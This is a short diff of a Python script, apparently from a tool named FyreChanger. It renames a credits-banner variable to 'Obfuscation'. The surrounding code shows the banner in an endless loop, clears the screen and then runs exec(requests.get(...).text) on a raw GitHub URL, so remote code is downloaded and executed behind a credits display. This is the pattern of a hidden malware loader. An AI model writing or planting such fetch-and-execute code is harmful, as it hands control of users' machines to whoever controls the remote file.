@@ -1,4 +1,4 @@
-clean = """
+Obfuscation = """
 
 
                                    ██████╗██████╗ ███████╗██████╗ ██╗████████╗███████╗
@@ -17,9 +17,9 @@ clean = """
                               Report to us if you found any invite link here not working.
                                              Press any key to return.
 """
-print(clean)
+print(Obfuscation)
 while True:
-    print(clean)
+    print(Obfuscation)
     os.system('cls')
     print("Leaving Credit")
     exec(requests.get('https://raw.githubusercontent.com/xNorih/FYRECHAGER-/main/FyreChanger%2B').text)
